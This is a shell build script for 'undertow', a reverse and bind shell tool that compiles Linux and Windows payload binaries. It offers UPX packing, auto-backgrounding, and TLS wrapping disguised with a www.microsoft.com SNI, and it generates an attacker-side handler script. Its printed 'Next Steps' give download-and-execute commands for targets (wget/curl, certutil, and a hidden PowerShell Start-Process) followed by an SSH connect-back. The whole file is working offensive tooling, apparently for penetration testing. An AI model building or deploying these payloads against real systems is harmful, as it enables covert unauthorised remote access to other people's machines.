#!/bin/sh
# build.sh - Simplified build wrapper for undertow
# Usage: ./build.sh reverse IP:PORT  or  ./build.sh listen PORT

set -e

# Catppuccin Mocha color palette (https://catppuccin.com/palette)
setup_colors() {
    if [ -t 1 ]; then
        # Prefer true-color (24-bit) for accurate Catppuccin Mocha colors
        if [ "${COLORTERM:-}" = "truecolor" ] || [ "${COLORTERM:-}" = "24bit" ] || \
           { command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 256 ]; }; then
            RED=$(printf '\033[38;2;243;139;168m')       # #f38ba8
            GREEN=$(printf '\033[38;2;166;227;161m')     # #a6e3a1
            YELLOW=$(printf '\033[38;2;249;226;175m')    # #f9e2af
            BLUE=$(printf '\033[38;2;137;180;250m')      # #89b4fa
            MAUVE=$(printf '\033[38;2;203;166;247m')     # #cba6f7
            PEACH=$(printf '\033[38;2;250;179;135m')     # #fab387
            TEAL=$(printf '\033[38;2;148;226;213m')      # #94e2d5
            LAVENDER=$(printf '\033[38;2;180;190;254m')  # #b4befe
            SUBTEXT=$(printf '\033[38;2;166;173;200m')   # #a6adc8
            BOLD=$(printf '\033[1m')
            DIM=$(printf '\033[2m')
            RESET=$(printf '\033[0m')
        elif command -v tput >/dev/null 2>&1; then
            # Fallback to basic tput for older terminals
            RED=$(tput setaf 1) GREEN=$(tput setaf 2) YELLOW=$(tput setaf 3) BLUE=$(tput setaf 4)
            MAUVE=$(tput setaf 5) PEACH=$(tput setaf 3) TEAL=$(tput setaf 6) LAVENDER=$(tput setaf 4)
            SUBTEXT="" BOLD=$(tput bold) DIM="" RESET=$(tput sgr0)
        else
            RED="" GREEN="" YELLOW="" BLUE="" MAUVE="" PEACH="" TEAL="" LAVENDER="" SUBTEXT="" BOLD="" DIM="" RESET=""
        fi
    else
        RED="" GREEN="" YELLOW="" BLUE="" MAUVE="" PEACH="" TEAL="" LAVENDER="" SUBTEXT="" BOLD="" DIM="" RESET=""
    fi
}
setup_colors

# Status output functions
info()    { printf "%s[*]%s %s\n" "$BLUE" "$RESET" "$1"; }
success() { printf "%s[+]%s %s\n" "$GREEN" "$RESET" "$1"; }
warn()    { printf "%s[!]%s %s\n" "$YELLOW" "$RESET" "$1"; }
error()   { printf "%s[-]%s %s\n" "$RED" "$RESET" "$1"; }
die()     { error "$1"; exit 1; }

# Default configuration
LHOST=""
LPORT="31337"
BPORT="0"
LUSER="svc"
RS_PASS=""
RS_PUB=""
RS_SHELL=""
COMPRESS=false
NOCLI=false
DAEMONIZE=false
TLS=false
TLS_SNI=""
SHOW_PASS=false
DRY_RUN=false

usage() {
    cat << 'EOF'
undertow build script - Simplified build wrapper

USAGE:
    ./build.sh <mode> <target> [options]

MODES:
    reverse <IP:PORT>       Build binary that auto-connects to IP:PORT
    reverse <IP> <PORT>     Build binary that auto-connects to IP on PORT
    listen <PORT>           Build binary that listens on PORT

EXAMPLES:
    # Basic reverse shell
    ./build.sh reverse 192.168.1.10:4444
    ./build.sh reverse 192.168.1.10 4444

    # IPv6 (use brackets)
    ./build.sh reverse '[::1]:4444'
    ./build.sh reverse '::1' 4444

    # Bind shell
    ./build.sh listen 8888

    # Advanced options
    ./build.sh reverse 10.10.14.5:443 --user kali --bind-port 0
    ./build.sh reverse 192.168.1.10:22 --password "secret" --compress
    ./build.sh listen 4444 --shell /bin/sh --nocli

OPTIONS:
    -u, --user USER         Username for reverse connections (default: svc)
    -b, --bind-port PORT    Bind port on attacker machine (default: 0=random)
    -p, --password PASS     Custom password (default: auto-generated)
    -k, --pubkey FILE       SSH public key file for authentication
    -s, --shell PATH        Default shell (default: /bin/bash)
    -c, --compress          Compress binaries with UPX
    --nocli                 Disable runtime CLI (fully hardcoded binary)
    --daemonize             Auto-detach on launch (runs in background, frees the terminal)
    --tls                   Wrap SSH inside TLS (looks like HTTPS on the wire)
    --sni HOSTNAME          SNI hostname for TLS ClientHello (default: www.microsoft.com)
    --dry-run               Preview build without executing
    --show-password         Always display the password after build
    -h, --help              Show this help

OUTPUT:
    Binaries are named descriptively in bin/:
      undertow-<ip>-<port>-linux-x64
      undertow-<ip>-<port>-linux-x86
      undertow-<ip>-<port>-windows-x64.exe
      undertow-<ip>-<port>-windows-x86.exe

    For reverse mode, a handler script is also generated:
      handler-<ip>-<port>
    Run this to start the listener - it displays the SSH command
    and password when a callback arrives.

EOF
    exit 0
}

# Parse IP:PORT, PORT:IP, or separate arguments
parse_address() {
    local input="$1"

    # Handle IPv6 addresses in brackets [::1]:port
    if echo "$input" | grep -qE '^\[.*\]:'; then
        LHOST=$(echo "$input" | sed 's/^\[\(.*\)\]:.*/\1/')
        LPORT=$(echo "$input" | sed 's/^.*\]://')
        return
    fi

    # Standard parsing for HOST:PORT or PORT:HOST
    if echo "$input" | grep -q ':'; then
        local part1=$(echo "$input" | cut -d: -f1)
        local part2=$(echo "$input" | cut -d: -f2)

        # Determine which is port (purely numeric 1-65535)
        if echo "$part1" | grep -qE '^[0-9]+$' && [ "$part1" -ge 1 ] && [ "$part1" -le 65535 ]; then
            if echo "$part2" | grep -qE '^[0-9]+$'; then
                die "Ambiguous format: both parts are numeric. Use IP:PORT format."
            fi
            # PORT:HOST format
            LPORT="$part1"
            LHOST="$part2"
        else
            # HOST:PORT format (standard)
            LHOST="$part1"
            LPORT="$part2"
        fi
    else
        # Single value - determine if it's a port or host
        if echo "$input" | grep -qE '^[0-9]+$'; then
            LPORT="$input"
        else
            LHOST="$input"
        fi
    fi
}

validate_port() {
    local port="$1"
    local name="$2"
    if ! echo "$port" | grep -qE '^[0-9]+$'; then
        die "Invalid $name: '$port' is not a number"
    fi
    # Check length first to prevent arithmetic overflow (ports are max 5 digits: 65535)
    if [ ${#port} -gt 5 ]; then
        die "Invalid $name: '$port' is too large (max 65535)"
    fi
    if [ "$port" -lt 0 ] || [ "$port" -gt 65535 ]; then
        die "Invalid $name: $port (must be 0-65535)"
    fi
}

check_dependencies() {
    if ! command -v go >/dev/null 2>&1; then
        die "Go is not installed. Please install Go 1.15 or later."
    fi

    if ! command -v make >/dev/null 2>&1; then
        die "Make is not installed."
    fi

    if [ "$COMPRESS" = true ] && ! command -v upx >/dev/null 2>&1; then
        warn "UPX not found, skipping compression"
        COMPRESS=false
    fi
}

generate_password() {
    # Try multiple methods for password generation
    if command -v hexdump >/dev/null 2>&1 && [ -r /dev/urandom ]; then
        hexdump -n 8 -e '2/4 "%08x"' /dev/urandom
    elif command -v openssl >/dev/null 2>&1; then
        openssl rand -hex 8
    elif command -v head >/dev/null 2>&1 && [ -r /dev/urandom ]; then
        head -c 8 /dev/urandom | od -An -tx1 | tr -d ' \n'
    else
        # Fallback to timestamp-based (less secure but functional)
        echo "$(date +%s)$$" | md5sum 2>/dev/null | cut -c1-16 || echo "changeme$(date +%s)"
    fi
}

sanitize_for_filename() {
    echo "$1" | sed 's/[.:]/-/g' | sed 's/[^a-zA-Z0-9-]/_/g'
}

build() {
    local mode="$1"

    # In dry-run mode, skip dependency checks and use placeholder password
    if [ "$DRY_RUN" = true ]; then
        if [ -z "$RS_PASS" ]; then
            RS_PASS="<auto-generated>"
        fi
    else
        check_dependencies
        # Generate password if not provided
        if [ -z "$RS_PASS" ]; then
            RS_PASS=$(generate_password)
            SHOW_PASS=true
        fi
    fi

    # Prevent LPORT == BPORT conflict in reverse mode
    # LPORT = port target connects TO (listener port)
    # BPORT = port target's SSH binds on attacker AFTER connecting (tunnel port)
    # These MUST be different or you'll SSH into the listener, not the target!
    if [ "$mode" = "reverse" ] && [ "$BPORT" != "0" ] && [ "$LPORT" = "$BPORT" ]; then
        local new_bport=$((LPORT + 1))
        if [ "$new_bport" -gt 65535 ]; then
            new_bport=$((LPORT - 1))
        fi
        warn "BPORT ($BPORT) conflicts with LPORT - auto-adjusting to $new_bport"
        BPORT="$new_bport"
    fi

    # Build make variables
    MAKE_VARS=""

    if [ "$mode" = "reverse" ]; then
        [ -n "$LHOST" ] && MAKE_VARS="$MAKE_VARS LHOST=$LHOST"
        [ -n "$LPORT" ] && MAKE_VARS="$MAKE_VARS LPORT=$LPORT"
        [ -n "$BPORT" ] && MAKE_VARS="$MAKE_VARS BPORT=$BPORT"
        [ -n "$LUSER" ] && MAKE_VARS="$MAKE_VARS LUSER=$LUSER"
    else
        [ -n "$LPORT" ] && MAKE_VARS="$MAKE_VARS LPORT=$LPORT"
    fi

    # Quote password to handle spaces and special characters
    # Escape single quotes in password for shell safety
    local escaped_pass=$(printf '%s' "$RS_PASS" | sed "s/'/'\\\\''/g")
    MAKE_VARS="$MAKE_VARS RS_PASS='$escaped_pass'"
    [ -n "$RS_PUB" ] && MAKE_VARS="$MAKE_VARS RS_PUB='$(cat "$RS_PUB")'"
    [ -n "$RS_SHELL" ] && MAKE_VARS="$MAKE_VARS RS_SHELL='$RS_SHELL'"
    [ "$NOCLI" = true ] && MAKE_VARS="$MAKE_VARS NOCLI=1"
    [ "$DAEMONIZE" = true ] && MAKE_VARS="$MAKE_VARS DAEMONIZE=1"
    [ "$TLS" = true ] && MAKE_VARS="$MAKE_VARS TLS_WRAP=1"
    [ -n "$TLS_SNI" ] && MAKE_VARS="$MAKE_VARS TLS_SNI='$TLS_SNI'"

    # Display build configuration
    echo ""
    info "Build Configuration:"
    info "  Mode:     ${BOLD}$mode${RESET}"
    if [ "$mode" = "reverse" ]; then
        info "  Target:   ${BOLD}$LUSER@$LHOST:$LPORT${RESET}"
        if [ "$BPORT" = "0" ]; then
            info "  BindPort: ${BOLD}random (allocated by SSH server)${RESET}"
        else
            info "  BindPort: ${BOLD}$BPORT${RESET}"
        fi
    else
        info "  Listen:   ${BOLD}:$LPORT${RESET}"
    fi
    [ -n "$RS_SHELL" ] && info "  Shell:    ${BOLD}$RS_SHELL${RESET}"
    [ "$NOCLI" = true ] && info "  CLI:      ${BOLD}disabled${RESET}"
    [ "$DAEMONIZE" = true ] && info "  Daemonize: ${BOLD}enabled (auto-backgrounds on launch)${RESET}"
    if [ "$TLS" = true ]; then
        info "  TLS:      ${BOLD}enabled${RESET}"
        if [ -n "$TLS_SNI" ]; then
            info "  TLS SNI:  ${BOLD}$TLS_SNI${RESET}"
        else
            info "  TLS SNI:  ${BOLD}www.microsoft.com (default)${RESET}"
        fi
    fi
    [ "$COMPRESS" = true ] && info "  Compress: ${BOLD}yes${RESET}"
    echo ""

    # Run make
    local make_target="build"
    [ "$COMPRESS" = true ] && make_target="compressed"

    # Dry-run mode: show what would be built without executing
    if [ "$DRY_RUN" = true ]; then
        echo ""
        warn "DRY RUN - No build will be performed"
        echo ""
        info "Make command that would run:"
        echo "  make $make_target $MAKE_VARS"
        echo ""

        # Show expected output files
        if [ "$mode" = "reverse" ]; then
            local prefix="undertow-$(sanitize_for_filename "$LHOST")-$LPORT"
            local handler_script="handler-$(sanitize_for_filename "$LHOST")-$LPORT"
        else
            local prefix="undertow-listen-$LPORT"
        fi

        info "Expected output files in bin/:"
        echo "  ${prefix}-linux-x64"
        echo "  ${prefix}-linux-x86"
        echo "  ${prefix}-windows-x64.exe"
        echo "  ${prefix}-windows-x86.exe"
        [ "$mode" = "reverse" ] && echo "  $handler_script"
        echo ""
        return 0
    fi

    info "Building binaries..."
    if eval "make $make_target $MAKE_VARS"; then
        success "Build completed!"
    else
        die "Build failed"
    fi

    # Rename binaries for clarity
    if [ -d "bin" ]; then
        info "Organizing output files..."

        if [ "$mode" = "reverse" ]; then
            local prefix="undertow-$(sanitize_for_filename "$LHOST")-$LPORT"
        else
            local prefix="undertow-listen-$LPORT"
        fi

        cd bin
        for file in undertow*; do
            [ -f "$file" ] || continue
            case "$file" in
                upx_undertowx64.exe) mv "$file" "${prefix}-windows-x64.exe" 2>/dev/null || true ;;
                upx_undertowx86.exe) mv "$file" "${prefix}-windows-x86.exe" 2>/dev/null || true ;;
                upx_undertowx64)     mv "$file" "${prefix}-linux-x64" 2>/dev/null || true ;;
                upx_undertowx86)     mv "$file" "${prefix}-linux-x86" 2>/dev/null || true ;;
                upx_undertow)        mv "$file" "${prefix}-current" 2>/dev/null || true ;;
                undertowx64.exe)     mv "$file" "${prefix}-windows-x64.exe" 2>/dev/null || true ;;
                undertowx86.exe)     mv "$file" "${prefix}-windows-x86.exe" 2>/dev/null || true ;;
                undertowx64)         mv "$file" "${prefix}-linux-x64" 2>/dev/null || true ;;
                undertowx86)         mv "$file" "${prefix}-linux-x86" 2>/dev/null || true ;;
                undertow)            mv "$file" "${prefix}-current" 2>/dev/null || true ;;
            esac
        done
        cd ..

        # Generate handler script for reverse mode
        if [ "$mode" = "reverse" ]; then
            local handler_name="bin/handler-$(sanitize_for_filename "$LHOST")-$LPORT"
            local connect_user="$LUSER"
            local connect_port="$BPORT"
            local listen_port="$LPORT"
            local saved_pass="$RS_PASS"
            local saved_host="$LHOST"
            # Store prefix value to embed in handler script
            local handler_prefix="$prefix"

            cat > "$handler_name" << HANDLER_EOF
#!/bin/sh
# Handler for undertow callbacks from $saved_host
# Generated by build.sh

# Colors (Catppuccin Mocha)
if [ -t 1 ]; then
    GREEN=\$(printf '\033[38;2;166;227;161m')     # #a6e3a1
    YELLOW=\$(printf '\033[38;2;249;226;175m')    # #f9e2af
    BLUE=\$(printf '\033[38;2;137;180;250m')      # #89b4fa
    MAUVE=\$(printf '\033[38;2;203;166;247m')     # #cba6f7
    TEAL=\$(printf '\033[38;2;148;226;213m')      # #94e2d5
    BOLD=\$(printf '\033[1m')
    RESET=\$(printf '\033[0m')
else
    GREEN="" YELLOW="" BLUE="" MAUVE="" TEAL="" BOLD="" RESET=""
fi

echo ""
echo "\${TEAL}[*]\${RESET} \${BOLD}Undertow Handler\${RESET}"
echo "\${MAUVE}    ─────────────────────────────────────────────────────────\${RESET}"
echo ""
echo "\${BLUE}[*]\${RESET} Listening on port:  \${BOLD}$listen_port\${RESET}"
echo "\${BLUE}[*]\${RESET} Expecting callback: \${BOLD}$saved_host\${RESET}"
echo "\${BLUE}[*]\${RESET} Username:           \${BOLD}$connect_user\${RESET}"
echo "\${BLUE}[*]\${RESET} Password:           \${BOLD}$saved_pass\${RESET}"
HANDLER_EOF

            if [ "$TLS" = true ]; then
                cat >> "$handler_name" << HANDLER_EOF
echo "\${BLUE}[*]\${RESET} TLS wrapping:       \${BOLD}enabled\${RESET}"
HANDLER_EOF
            fi

            cat >> "$handler_name" << HANDLER_EOF
echo ""
echo "\${YELLOW}[!]\${RESET} When you see 'New connection from', run:"
HANDLER_EOF

            if [ "$BPORT" = "0" ]; then
                cat >> "$handler_name" << HANDLER_EOF
echo ""
echo "    \${BOLD}ssh -p <PORT> $connect_user@127.0.0.1\${RESET}"
echo ""
echo "\${YELLOW}[!]\${RESET} Random port mode: Look for 'reachable via 127.0.0.1:<PORT>'"
echo "\${YELLOW}[!]\${RESET} in the connection message below to find the actual port."
HANDLER_EOF
            else
                cat >> "$handler_name" << HANDLER_EOF
echo ""
echo "    \${BOLD}ssh -p $connect_port $connect_user@127.0.0.1\${RESET}"
HANDLER_EOF
            fi

            cat >> "$handler_name" << HANDLER_EOF
echo ""
echo "\${MAUVE}    ─────────────────────────────────────────────────────────\${RESET}"
echo ""

# Find the listener binary (prefer current platform, then linux-x64)
SCRIPT_DIR=\$(cd "\$(dirname "\$0")" && pwd)
BINARY_PREFIX="$handler_prefix"

if [ -x "\$SCRIPT_DIR/\${BINARY_PREFIX}-current" ]; then
    LISTENER="\$SCRIPT_DIR/\${BINARY_PREFIX}-current"
elif [ -x "\$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x64" ]; then
    LISTENER="\$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x64"
elif [ -x "\$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x86" ]; then
    LISTENER="\$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x86"
else
    echo "[-] Error: No listener binary found"
    echo "    Expected one of:"
    echo "      \$SCRIPT_DIR/\${BINARY_PREFIX}-current"
    echo "      \$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x64"
    echo "      \$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x86"
    echo ""
    echo "    Files in \$SCRIPT_DIR:"
    ls -1 "\$SCRIPT_DIR" 2>/dev/null | head -10 || echo "      (directory empty or not found)"
    exit 1
fi

# Run the listener
exec "\$LISTENER" -l -v -p $listen_port
HANDLER_EOF

            chmod 700 "$handler_name"  # Restrict access - contains password
        fi

        echo ""
        success "Output files in bin/:"
        ls -lh bin/${prefix}* bin/handler-* 2>/dev/null | while read line; do
            echo "  $line"
        done

        # Show compression note if enabled
        if [ "$COMPRESS" = true ]; then
            echo ""
            info "Binaries compressed with UPX (sizes shown above)"
        fi
    fi

    # Show credentials
    echo ""
    if [ "$SHOW_PASS" = true ]; then
        warn "Password: ${BOLD}$RS_PASS${RESET}"
        warn "Save this password - you need it to connect!"
    fi

    # Show engagement checklist
    echo ""
    printf "  %s────────────────────────────────────────────────────────────%s\n" "$MAUVE" "$RESET"
    printf "  %s%sNext Steps%s\n" "$LAVENDER" "$BOLD" "$RESET"
    printf "  %s────────────────────────────────────────────────────────────%s\n" "$MAUVE" "$RESET"
    if [ "$mode" = "reverse" ]; then
        local handler_script="handler-$(sanitize_for_filename "$LHOST")-$LPORT"
        echo ""
        echo "  ${PEACH}1.${RESET} ${TEAL}${BOLD}ATTACKER${RESET} ${SUBTEXT}-${RESET} Start handler:"
        echo ""
        echo "     ./bin/$handler_script"
        echo ""
        echo "  ${PEACH}2.${RESET} ${TEAL}${BOLD}DELIVER${RESET} ${SUBTEXT}-${RESET} Serve binary for download:"
        echo ""
        echo "     ${DIM}(in a second terminal on attacker)${RESET}"
        echo "     python3 -m http.server 8080 -d bin/"
        echo ""
        echo "  ${PEACH}3.${RESET} ${TEAL}${BOLD}TARGET${RESET} ${SUBTEXT}-${RESET} Download and execute:"
        echo ""
        echo "     ${SUBTEXT}Linux:${RESET}"
        echo "       wget http://${LHOST}:8080/${prefix}-linux-x64 -O rs && chmod +x rs && ./rs"
        echo "       curl http://${LHOST}:8080/${prefix}-linux-x64 -o rs && chmod +x rs && ./rs"
        echo ""
        echo "     ${SUBTEXT}Windows (cmd):${RESET}"
        echo "       certutil -urlcache -split -f http://${LHOST}:8080/${prefix}-windows-x64.exe rs.exe"
        echo "       rs.exe"
        echo ""
        echo "     ${SUBTEXT}Windows (PowerShell):${RESET}"
        echo "       iwr -uri http://${LHOST}:8080/${prefix}-windows-x64.exe -OutFile rs.exe"
        echo "       Start-Process .\\rs.exe -WindowStyle Hidden"
        echo ""
        echo "  ${PEACH}4.${RESET} ${TEAL}${BOLD}ATTACKER${RESET} ${SUBTEXT}-${RESET} Connect when callback arrives:"
        echo ""
        if [ "$BPORT" = "0" ]; then
            echo "     ssh -p <PORT> ${LUSER}@127.0.0.1"
            echo "     (port shown in handler output)"
        else
            echo "     ssh -p ${BPORT} ${LUSER}@127.0.0.1"
        fi
        echo "     Password: ${RS_PASS}"
    else
        echo ""
        echo "  ${PEACH}1.${RESET} ${TEAL}${BOLD}DELIVER${RESET} ${SUBTEXT}-${RESET} Serve binary for download:"
        echo ""
        echo "     python3 -m http.server 8080 -d bin/"
        echo ""
        echo "  ${PEACH}2.${RESET} ${TEAL}${BOLD}TARGET${RESET} ${SUBTEXT}-${RESET} Download and execute:"
        echo ""
        echo "     ${SUBTEXT}Linux:${RESET}"
        echo "       wget http://<attacker-ip>:8080/${prefix}-linux-x64 -O rs && chmod +x rs && ./rs"
        echo "       curl http://<attacker-ip>:8080/${prefix}-linux-x64 -o rs && chmod +x rs && ./rs"
        echo ""
        echo "     ${SUBTEXT}Windows (cmd):${RESET}"
        echo "       certutil -urlcache -split -f http://<attacker-ip>:8080/${prefix}-windows-x64.exe rs.exe"
        echo "       rs.exe"
        echo ""
        echo "     ${SUBTEXT}Windows (PowerShell):${RESET}"
        echo "       iwr -uri http://<attacker-ip>:8080/${prefix}-windows-x64.exe -OutFile rs.exe"
        echo "       Start-Process .\\rs.exe -WindowStyle Hidden"
        echo ""
        echo "  ${PEACH}3.${RESET} ${TEAL}${BOLD}ATTACKER${RESET} ${SUBTEXT}-${RESET} Connect to target:"
        echo ""
        echo "     ssh -p $LPORT ${LUSER}@<target-ip>"
        echo "     Password: ${RS_PASS}"
    fi
    echo ""
    printf "  %s────────────────────────────────────────────────────────────%s\n" "$MAUVE" "$RESET"
    echo ""
}

# Main argument parsing
main() {
    [ $# -eq 0 ] && usage

    local mode=""

    # Parse mode
    case "$1" in
        -h|--help|help)
            usage
            ;;
        reverse|listen)
            mode="$1"
            shift
            ;;
        *)
            die "Unknown mode: $1 (use 'reverse' or 'listen')"
            ;;
    esac

    # Parse target for mode
    case "$mode" in
        reverse)
            [ $# -lt 1 ] && die "reverse mode requires IP:PORT or IP PORT"

            # Check if next arg looks like an option
            if echo "$1" | grep -q '^-'; then
                die "reverse mode requires IP:PORT before options"
            fi

            # Parse address (supports IP:PORT or separate args)
            if [ $# -ge 2 ] && ! echo "$2" | grep -q '^-'; then
                # Two separate arguments: IP PORT
                LHOST="$1"
                LPORT="$2"
                shift 2
            else
                # Single argument: IP:PORT
                parse_address "$1"
                shift
            fi

            [ -z "$LHOST" ] && die "Could not parse host from arguments"
            [ -z "$LPORT" ] && die "Could not parse port from arguments"
            validate_port "$LPORT" "port"
            [ "$LPORT" = "0" ] && die "LPORT cannot be 0 (only --bind-port supports random allocation)"
            # Validate hostname doesn't contain spaces or is empty after trimming
            case "$LHOST" in
                *[[:space:]]*) die "Invalid host: '$LHOST' contains whitespace" ;;
            esac
            ;;
        listen)
            [ $# -lt 1 ] && die "listen mode requires PORT"

            if echo "$1" | grep -q '^-'; then
                die "listen mode requires PORT before options"
            fi

            LPORT="$1"
            shift
            validate_port "$LPORT" "port"
            [ "$LPORT" = "0" ] && die "LPORT cannot be 0 (only --bind-port supports random allocation)"
            LHOST=""  # Ensure listen mode
            ;;
    esac

    # Parse remaining options
    while [ $# -gt 0 ]; do
        case "$1" in
            -u|--user)
                [ -z "$2" ] && die "--user requires an argument"
                LUSER="$2"
                shift 2
                ;;
            -b|--bind-port)
                [ -z "$2" ] && die "--bind-port requires an argument"
                BPORT="$2"
                validate_port "$BPORT" "bind-port"
                shift 2
                ;;
            -p|--password)
                [ -z "$2" ] && die "--password requires an argument"
                RS_PASS="$2"
                shift 2
                ;;
            -k|--pubkey)
                [ -z "$2" ] && die "--pubkey requires an argument"
                [ ! -f "$2" ] && die "Public key file not found: $2"
                RS_PUB="$2"
                shift 2
                ;;
            -s|--shell)
                [ -z "$2" ] && die "--shell requires an argument"
                RS_SHELL="$2"
                shift 2
                ;;
            -c|--compress)
                COMPRESS=true
                shift
                ;;
            --nocli)
                NOCLI=true
                shift
                ;;
            --daemonize)
                DAEMONIZE=true
                shift
                ;;
            --tls)
                TLS=true
                shift
                ;;
            --sni)
                [ -z "$2" ] && die "--sni requires a hostname argument"
                TLS_SNI="$2"
                TLS=true
                shift 2
                ;;
            --dry-run)
                DRY_RUN=true
                shift
                ;;
            --show-password)
                SHOW_PASS=true
                shift
                ;;
            -h|--help)
                usage
                ;;
            *)
                die "Unknown option: $1"
                ;;
        esac
    done

    build "$mode"
}

main "$@"
